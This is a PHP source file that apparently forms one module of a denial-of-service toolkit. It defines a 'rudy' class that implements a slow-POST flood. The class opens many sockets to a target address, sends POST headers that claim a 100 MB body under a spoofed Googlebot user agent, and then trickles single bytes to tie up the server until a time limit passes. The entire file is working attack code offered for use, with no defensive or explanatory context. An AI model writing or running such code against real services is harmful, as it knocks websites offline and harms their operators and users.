<?php
include_once "../header.php";
class rudy{
	public $ip;
	public $port;
	public $socketn;
	public $max_time;
	public function __construct($ip, $port, $socketn, $max_time) {
		$this->ip = $ip;
		$this->port = $port;
		$this->socketn = $socketn;
		$this->max_time = $max_time;
	}
	public function start(){
		$packet=0;
		while(1){ 
			if(time() > $this->max_time){
				return $packet;
				break; 
			}
			for($i=0;$i<=$this->socketn;$i++){
				$sock[$i] = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
				socket_connect($sock[$i], $this->ip, $this->port);
				$out="POST / HTTP/1.1\r\n";
				$out.="Host: ".$this->ip."\r\n";
				$out.="Connection: keep-alive\r\n";
				$out.="User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n";
				$out.="Content-length: 100000000\r\n";
				$out.= "\r\n";
				$packet++; 
				socket_write($sock[$i], $out);
			}
			for($j=0;$j<=$packet;$j++){
				socket_write($sock[$j], "A");
			}
		}
	}
}
?>